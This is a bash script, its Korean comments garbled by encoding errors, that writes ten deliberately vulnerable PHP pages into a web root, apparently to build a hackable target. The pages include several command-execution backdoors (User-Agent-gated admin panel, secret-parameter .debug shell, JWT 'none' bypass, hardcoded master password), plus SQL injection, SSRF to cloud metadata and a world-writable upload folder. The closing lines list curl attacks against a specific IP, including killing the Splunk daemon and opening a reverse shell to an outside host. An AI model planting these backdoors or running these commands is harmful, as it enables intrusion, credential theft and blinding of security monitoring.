#!/bin/bash
# ì˜í™”ê°™ì€ ê°„ì§€ë‚˜ëŠ” í•´í‚¹ ì·¨ì•½ì 

echo "=========================================="
echo "ğŸ¬ ì˜í™” ìŠ¤íƒ€ì¼ í•´í‚¹ ì·¨ì•½ì "
echo "=========================================="
echo ""

# 1. ìˆ¨ê²¨ì§„ ê´€ë¦¬ì í¬í„¸ (ì˜í™”ì—ì„œ ìì£¼ ë‚˜ì˜¤ëŠ”)
echo "[1] ìˆ¨ê²¨ì§„ ê´€ë¦¬ì íŒ¨ë„ (URL ì¶”ì¸¡ìœ¼ë¡œ ë°œê²¬)"
cat > /var/www/html/s3cr3t_4dm1n_p4n3l.php << 'EOF'
<?php
// Hidden admin panel
// Access: /s3cr3t_4dm1n_p4n3l.php

session_start();

// ì•½í•œ ì¸ì¦: íŠ¹ì • User-Agentë©´ ë°”ë¡œ ì ‘ê·¼
if ($_SERVER['HTTP_USER_AGENT'] == 'AdminBot/1.0') {
    $_SESSION['admin'] = true;
}

if (isset($_SESSION['admin'])) {
    echo "<h1>ğŸ”“ Secret Admin Panel</h1>";

    if (isset($_GET['exec'])) {
        echo "<pre>";
        system($_GET['exec']);
        echo "</pre>";
    }

    echo '<form method="get">';
    echo '<input type="text" name="exec" placeholder="Command">';
    echo '<button>Execute</button>';
    echo '</form>';
} else {
    // ì˜í™”ì—ì„œì²˜ëŸ¼ "403 Forbidden"ì²˜ëŸ¼ ë³´ì´ì§€ë§Œ íŒíŠ¸ê°€ ìˆ¨ì–´ìˆìŒ
    echo "<!-- Hint: Use AdminBot/1.0 as User-Agent -->";
    http_response_code(403);
    die("Access Denied");
}
?>
EOF
echo "[+] s3cr3t_4dm1n_p4n3l.php ìƒì„± (ìˆ¨ê²¨ì§„ ê´€ë¦¬ì íŒ¨ë„)"

# 2. íƒ€ì´ë° ê¸°ë°˜ Race Condition (ì˜í™”ì—ì„œ ë¹ ë¥´ê²Œ íƒ€ì´í•‘í•˜ëŠ” ì¥ë©´)
echo ""
echo "[2] Race Condition ì·¨ì•½ì "
cat > /var/www/html/transfer.php << 'EOF'
<?php
// í¬ì¸íŠ¸ ì „ì†¡ (Race Condition ì·¨ì•½)
session_start();

if (!isset($_SESSION['user'])) {
    die('Unauthorized');
}

if (isset($_POST['to']) && isset($_POST['amount'])) {
    include 'config.php';

    $from = $_SESSION['user_id'];
    $to = $_POST['to'];
    $amount = $_POST['amount'];

    // ì”ì•¡ í™•ì¸
    $result = mysqli_query($conn, "SELECT points FROM users WHERE id=$from");
    $row = mysqli_fetch_assoc($result);

    // ì·¨ì•½ì : ì²´í¬ì™€ ì‹¤í–‰ ì‚¬ì´ì— ì‹œê°„ ì°¨ì´
    // ë™ì‹œì— ì—¬ëŸ¬ ë²ˆ ìš”ì²­í•˜ë©´ ì”ì•¡ ì´ìƒ ë¹ ì ¸ë‚˜ê°
    sleep(0.1); // ì‘ì€ ë”œë ˆì´

    if ($row['points'] >= $amount) {
        // í¬ì¸íŠ¸ ì°¨ê° ë° ì „ì†¡
        mysqli_query($conn, "UPDATE users SET points = points - $amount WHERE id = $from");
        mysqli_query($conn, "UPDATE users SET points = points + $amount WHERE id = $to");

        echo "Transfer successful!";
    } else {
        echo "Insufficient balance";
    }
}
?>
EOF
echo "[+] transfer.php ìƒì„± (Race Condition)"

# 3. JWT ìœ„ì¡° (None ì•Œê³ ë¦¬ì¦˜) - ì˜í™”ì—ì„œ "ì•Œê³ ë¦¬ì¦˜ ìš°íšŒ" ì¥ë©´
echo ""
echo "[3] JWT í† í° ìœ„ì¡° ì·¨ì•½ì "
cat > /var/www/html/api/auth.php << 'EOF'
<?php
// JWT ì¸ì¦ API

function base64url_encode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode($data) {
    return base64_decode(strtr($data, '-_', '+/'));
}

if (isset($_GET['token'])) {
    $token = $_GET['token'];
    $parts = explode('.', $token);

    if (count($parts) == 3) {
        $header = json_decode(base64url_decode($parts[0]), true);
        $payload = json_decode(base64url_decode($parts[1]), true);

        // ì·¨ì•½ì : "none" ì•Œê³ ë¦¬ì¦˜ì„ í—ˆìš©í•¨
        if ($header['alg'] == 'none') {
            // ì„œëª… ê²€ì¦ ì•ˆí•¨!
            echo "Authenticated as: " . $payload['user'];

            if ($payload['role'] == 'admin') {
                echo "\n\nAdmin access granted!";

                if (isset($_GET['cmd'])) {
                    echo "\n\n";
                    system($_GET['cmd']);
                }
            }
        }
    }
}

echo "\n\n<!-- Generate token: {\"alg\":\"none\",\"typ\":\"JWT\"}.{\"user\":\"admin\",\"role\":\"admin\"}. -->";
?>
EOF
echo "[+] api/auth.php ìƒì„± (JWT None ì•Œê³ ë¦¬ì¦˜)"

# 4. ì‹œê°„ ê¸°ë°˜ Blind SQL Injection (ì˜í™”ì—ì„œ ë”±ë”± ë§ì¶”ëŠ” ì¥ë©´)
echo ""
echo "[4] ì‹œê°„ ê¸°ë°˜ Blind SQLi"
cat > /var/www/html/check_user.php << 'EOF'
<?php
include 'config.php';

if (isset($_GET['username'])) {
    $username = $_GET['username'];

    // SQL Injection ì·¨ì•½ (ì‹œê°„ ê¸°ë°˜)
    $query = "SELECT * FROM users WHERE username = '$username'";
    $result = mysqli_query($conn, $query);

    if (mysqli_num_rows($result) > 0) {
        echo "User exists";
    } else {
        echo "User not found";
    }
}

// Hint: Try: admin' AND SLEEP(5)--
?>
EOF
echo "[+] check_user.php ìƒì„± (Time-based Blind SQLi)"

# 5. IDOR (Insecure Direct Object Reference) - ì˜í™”ì—ì„œ IDë§Œ ë°”ê¿”ì„œ ì¹¨íˆ¬
echo ""
echo "[5] IDOR ì·¨ì•½ì "
cat > /var/www/html/view_profile.php << 'EOF'
<?php
// ë‹¤ë¥¸ ì‚¬ìš©ì í”„ë¡œí•„ ë³´ê¸°
include 'config.php';

if (isset($_GET['user_id'])) {
    $user_id = $_GET['user_id'];

    // ê¶Œí•œ ì²´í¬ ì—†ìŒ! (IDOR)
    $result = mysqli_query($conn, "SELECT * FROM users WHERE id = $user_id");
    $user = mysqli_fetch_assoc($result);

    if ($user) {
        echo "<h1>Profile: " . $user['username'] . "</h1>";
        echo "<p>Email: " . $user['email'] . "</p>";
        echo "<p>Role: " . $user['role'] . "</p>";

        // ê´€ë¦¬ìëŠ” ì¶”ê°€ ê¸°ëŠ¥
        if ($user['role'] == 'admin') {
            echo "<h2>Admin Panel</h2>";
            if (isset($_GET['exec'])) {
                system($_GET['exec']);
            }
        }
    }
}
?>
EOF
echo "[+] view_profile.php ìƒì„± (IDOR)"

# 6. ìˆ¨ê²¨ì§„ ë””ë²„ê·¸ í¬íŠ¸/ì—”ë“œí¬ì¸íŠ¸ (ì˜í™”ì—ì„œ "ë°±ë„ì–´ ë°œê²¬" ì¥ë©´)
echo ""
echo "[6] ìˆ¨ê²¨ì§„ ë°±ë„ì–´ ì—”ë“œí¬ì¸íŠ¸"
cat > /var/www/html/.debug << 'EOF'
<?php
// Emergency debug endpoint
// Only accessible with secret parameter

if (isset($_GET['secret']) && $_GET['secret'] == 'debug_2024') {
    if (isset($_GET['action'])) {
        switch($_GET['action']) {
            case 'shell':
                system($_GET['cmd']);
                break;
            case 'sql':
                include 'config.php';
                $result = mysqli_query($conn, $_GET['query']);
                while($row = mysqli_fetch_assoc($result)) {
                    print_r($row);
                }
                break;
            case 'files':
                echo shell_exec('ls -la ' . $_GET['path']);
                break;
        }
    }
}
?>
EOF
echo "[+] .debug ìƒì„± (ìˆ¨ê²¨ì§„ ë°±ë„ì–´)"

# 7. XXE to RCE (ì˜í™”ì—ì„œ XML íŒŒì¼ ìˆ˜ì •í•˜ëŠ” ì¥ë©´)
echo ""
echo "[7] XXE to RCE"
cat > /var/www/html/import.php << 'EOF'
<?php
// XML ë°ì´í„° import

if (isset($_POST['xml'])) {
    $xml = $_POST['xml'];

    // libxml ì˜µì…˜ìœ¼ë¡œ XXE ì·¨ì•½
    libxml_disable_entity_loader(false);

    $doc = new DOMDocument();
    $doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

    echo "Import completed: " . $doc->saveXML();
}

echo '
<!-- Example XXE:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
-->
';
?>
EOF
echo "[+] import.php ìƒì„± (XXE)"

# 8. í•˜ë“œì½”ë”©ëœ ë§ˆìŠ¤í„° í‚¤ (ì˜í™”ì—ì„œ "ë§ˆìŠ¤í„° íŒ¨ìŠ¤ì›Œë“œ ë°œê²¬" ì¥ë©´)
echo ""
echo "[8] í•˜ë“œì½”ë”©ëœ ë§ˆìŠ¤í„° í‚¤"
cat > /var/www/html/maintenance.php << 'EOF'
<?php
// ìœ ì§€ë³´ìˆ˜ ëª¨ë“œ
// ë§ˆìŠ¤í„° í‚¤ë¡œ ëª¨ë“  ê³„ì • ì ‘ê·¼ ê°€ëŠ¥

$MASTER_PASSWORD = "superadmin2024!@#";

if (isset($_POST['password'])) {
    if ($_POST['password'] == $MASTER_PASSWORD) {
        echo "<h1>ğŸ”“ Master Access Granted</h1>";

        if (isset($_GET['sudo'])) {
            echo "<pre>";
            system($_GET['sudo']);
            echo "</pre>";
        }

        echo '<form method="get">';
        echo '<input name="sudo" placeholder="Root command">';
        echo '<button>Execute as root</button>';
        echo '</form>';
    }
}

echo '<!-- Master password hash: ' . md5($MASTER_PASSWORD) . ' -->';
?>
EOF
echo "[+] maintenance.php ìƒì„± (ë§ˆìŠ¤í„° í‚¤)"

# 9. SSRF to AWS Metadata (ì˜í™”ì—ì„œ "ë‚´ë¶€ë§ ì¹¨íˆ¬" ì¥ë©´)
echo ""
echo "[9] SSRF to AWS Metadata"
cat > /var/www/html/fetch.php << 'EOF'
<?php
// URL ê°€ì ¸ì˜¤ê¸° ê¸°ëŠ¥

if (isset($_GET['url'])) {
    $url = $_GET['url'];

    // URL ê²€ì¦ ì—†ìŒ!
    $content = file_get_contents($url);
    echo $content;
}

echo "\n<!-- Try: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ -->";
?>
EOF
echo "[+] fetch.php ìƒì„± (SSRF to AWS)"

# 10. Polyglot íŒŒì¼ ì—…ë¡œë“œ (ì˜í™”ì—ì„œ "ìœ„ì¥ íŒŒì¼" ì¥ë©´)
echo ""
echo "[10] Polyglot íŒŒì¼ í—ˆìš©"
mkdir -p /var/www/html/uploads
chmod 777 /var/www/html/uploads
echo "[+] uploads í´ë” ê¶Œí•œ ì„¤ì • (Polyglot ì—…ë¡œë“œ ê°€ëŠ¥)"

echo ""
echo "=========================================="
echo "ğŸ¬ ì˜í™” ìŠ¤íƒ€ì¼ í•´í‚¹ ì™„ë£Œ!"
echo "=========================================="
echo ""
echo "[!] ê°„ì§€ë‚˜ëŠ” ê³µê²© ê²½ë¡œ:"
echo ""
echo "ğŸ¯ ì‹œë‚˜ë¦¬ì˜¤ 1: ìˆ¨ê²¨ì§„ ê´€ë¦¬ì íŒ¨ë„"
echo "  curl -H 'User-Agent: AdminBot/1.0' http://43.201.154.142/s3cr3t_4dm1n_p4n3l.php?exec=id"
echo ""
echo "ğŸ¯ ì‹œë‚˜ë¦¬ì˜¤ 2: JWT None ì•Œê³ ë¦¬ì¦˜ ìš°íšŒ"
echo "  Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
echo "  curl 'http://43.201.154.142/api/auth.php?token=...&cmd=id'"
echo ""
echo "ğŸ¯ ì‹œë‚˜ë¦¬ì˜¤ 3: IDOR â†’ Admin ê¶Œí•œ"
echo "  curl 'http://43.201.154.142/view_profile.php?user_id=1&exec=whoami'"
echo ""
echo "ğŸ¯ ì‹œë‚˜ë¦¬ì˜¤ 4: ìˆ¨ê²¨ì§„ ë°±ë„ì–´"
echo "  curl 'http://43.201.154.142/.debug?secret=debug_2024&action=shell&cmd=id'"
echo ""
echo "ğŸ¯ ì‹œë‚˜ë¦¬ì˜¤ 5: SSRF to AWS"
echo "  curl 'http://43.201.154.142/fetch.php?url=http://169.254.169.254/latest/meta-data/'"
echo ""
echo "ğŸ¯ ì‹œë‚˜ë¦¬ì˜¤ 6: ë§ˆìŠ¤í„° í‚¤ ë°œê²¬"
echo "  curl -X POST http://43.201.154.142/maintenance.php -d 'password=superadmin2024!@#' -G -d 'sudo=id'"
echo ""
echo "ğŸ’€ Splunk ë¬´ë ¥í™” í›„ ê³µê²©:"
echo "  curl -H 'User-Agent: AdminBot/1.0' 'http://43.201.154.142/s3cr3t_4dm1n_p4n3l.php?exec=pkill%20-9%20splunkd'"
echo ""
echo "ğŸš€ ë¦¬ë²„ìŠ¤ ì‰˜:"
echo "  curl -H 'User-Agent: AdminBot/1.0' 'http://43.201.154.142/s3cr3t_4dm1n_p4n3l.php?exec=bash%20-i%20%3E%26%20/dev/tcp/57.181.28.7/4444%200%3E%261%20%26'"
